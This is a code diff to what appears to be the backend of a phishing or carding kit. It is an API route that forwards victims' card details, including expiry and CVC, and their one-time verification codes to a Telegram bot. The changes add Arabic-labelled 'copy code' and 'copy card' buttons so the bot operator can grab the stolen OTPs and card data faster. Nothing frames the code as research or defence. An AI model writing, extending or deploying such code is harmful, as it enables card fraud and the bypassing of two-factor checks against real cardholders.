@@ -18,13 +18,15 @@ function detectCardType(number: string): string {
   return "💳 Bank Card";
 }
 
-async function sendMessage(text: string) {
+async function sendMessage(text: string, replyMarkup?: object) {
+  const body: Record<string, unknown> = { chat_id: process.env.TELEGRAM_CHAT_ID, text, parse_mode: "HTML" };
+  if (replyMarkup) body.reply_markup = replyMarkup;
   return fetch(
     `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
+      body: JSON.stringify(body),
     }
   );
 }
@@ -37,7 +39,8 @@ export async function POST(req: NextRequest) {
     if (type === "otp") {
       const { transactionId, otp } = body;
       await sendMessage(
-        `🔑 <b>تم استلام رمز التحقق</b>\n\n🆔 <b>Transaction ID:</b> <code>${transactionId}</code>\n🔢 <b>الرمز:</b> <code>${otp}</code>`
+        `🔑 <b>تم استلام رمز التحقق</b>\n\n🆔 <b>Transaction ID:</b> <code>${transactionId}</code>\n🔢 <b>الرمز:</b> <code>${otp}</code>`,
+        { inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: otp } }]] }
       );
       return NextResponse.json({ ok: true });
     }
@@ -77,7 +80,12 @@ ${cardType}
 📋 <b>Transaction Type:</b> ${serviceLabel}
 `.trim();
 
-    const res = await sendMessage(message);
+    const copyText = `${maskedCard}\n${expiry || "—"}\n${cvc || "—"}`;
+    const replyMarkup = {
+      inline_keyboard: [[{ text: "📋 نسخ البطاقة", copy_text: { text: copyText } }]],
+    };
+
+    const res = await sendMessage(message, replyMarkup);
     if (!res.ok) {
       const err = await res.text();
       return NextResponse.json({ error: err }, { status: 500 });
